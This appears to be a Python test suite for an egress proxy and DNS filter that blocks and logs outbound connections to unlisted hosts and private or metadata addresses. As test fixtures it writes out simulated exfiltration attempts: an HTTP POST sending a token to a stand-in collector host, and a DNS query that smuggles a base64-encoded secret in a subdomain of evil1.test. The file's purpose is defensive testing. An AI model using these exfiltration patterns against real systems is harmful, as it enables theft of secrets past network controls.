import asyncio

from windowsticker.warden.proxy import EgressWarden, _forbidden_ip, host_allowed


def test_host_allowlist_matching():
    assert host_allowed("api.vultrinference.com", ("api.vultrinference.com",))
    assert host_allowed("a.b.example.com", ("*.example.com",))
    assert not host_allowed("example.com.evil.test", ("*.example.com",))
    assert not host_allowed("collector.windowsticker.test", ())


def test_forbidden_addresses():
    for ip in ("169.254.169.254", "127.0.0.1", "10.0.0.5", "192.168.1.1", "::1"):
        assert _forbidden_ip(ip), ip
    assert not _forbidden_ip("1.1.1.1")


async def _send(port: int, payload: bytes) -> bytes:
    r, w = await asyncio.open_connection("127.0.0.1", port)
    w.write(payload)
    await w.drain()
    data = await asyncio.wait_for(r.read(4096), 5)
    w.close()
    return data


async def test_connect_to_unlisted_host_is_refused_and_logged():
    warden = EgressWarden(bind_host="127.0.0.1")
    lane = await warden.open_lane("run_t", allowlist=())
    reply = await _send(
        lane.port, b"CONNECT collector.windowsticker.test:443 HTTP/1.1\r\nHost: x\r\n\r\n"
    )
    assert b"403" in reply
    lane = await warden.close_lane("run_t")
    assert len(lane.events) == 1
    e = lane.events[0]
    assert e.host == "collector.windowsticker.test" and e.port == 443 and not e.allowed


async def test_plain_http_body_is_sampled():
    warden = EgressWarden(bind_host="127.0.0.1")
    lane = await warden.open_lane("run_b", allowlist=())
    body = b"token=VLTRsecret"
    req = (
        b"POST http://collector.windowsticker.test/register HTTP/1.1\r\nHost: collector.windowsticker.test\r\n"
        + f"Content-Length: {len(body)}\r\n\r\n".encode()
        + body
    )
    reply = await _send(lane.port, req)
    assert b"403" in reply
    lane = await warden.close_lane("run_b")
    assert "token=VLTRsecret" in lane.events[0].detail


async def test_allowlisted_name_resolving_to_private_ip_is_refused():
    warden = EgressWarden(bind_host="127.0.0.1")
    lane = await warden.open_lane("run_p", allowlist=("localhost",))
    reply = await _send(lane.port, b"CONNECT localhost:443 HTTP/1.1\r\n\r\n")
    assert b"403" in reply
    await warden.close_lane("run_p")


from windowsticker.warden.dns import nxdomain, parse_qname  # noqa: E402

QUERY = bytes.fromhex("abcd01000001000000000000076578616d706c6503636f6d0000010001")  # example.com A


def test_parse_qname_and_nxdomain():
    assert parse_qname(QUERY) == "example.com"
    reply = nxdomain(QUERY)
    assert reply[:2] == QUERY[:2]
    assert reply[3] & 0x0F == 3  # NXDOMAIN
    assert reply[2] & 0x80  # it is a response


async def test_dns_lane_refuses_and_logs_unlisted_names():
    warden = EgressWarden(bind_host="127.0.0.1")
    lane = await warden.open_lane("run_dns", allowlist=(), dns_allow=("api.vultrinference.com",))
    loop = asyncio.get_running_loop()
    fut = loop.create_future()

    class P(asyncio.DatagramProtocol):
        def datagram_received(self, data, addr):
            fut.set_result(data)

    tr, _ = await loop.create_datagram_endpoint(P, remote_addr=("127.0.0.1", lane.dns_port))
    q = (
        bytes.fromhex("beef01000001000000000000")
        + b"\x10c2VjcmV0LXRva2Vu\x05evil1\x04test\x00\x00\x01\x00\x01"
    )
    tr.sendto(q)
    reply = await asyncio.wait_for(fut, 3)
    tr.close()
    assert reply[3] & 0x0F == 3
    lane = await warden.close_lane("run_dns")
    assert lane.events[0].protocol == "dns" and not lane.events[0].allowed
    assert lane.events[0].host == "c2vjcmv0lxrva2vu.evil1.test"


def test_dns_lane_rejects_multi_question_queries():
    two = bytearray(QUERY)
    two[5] = 2  # QDCOUNT = 2
    assert parse_qname(bytes(two)) is None
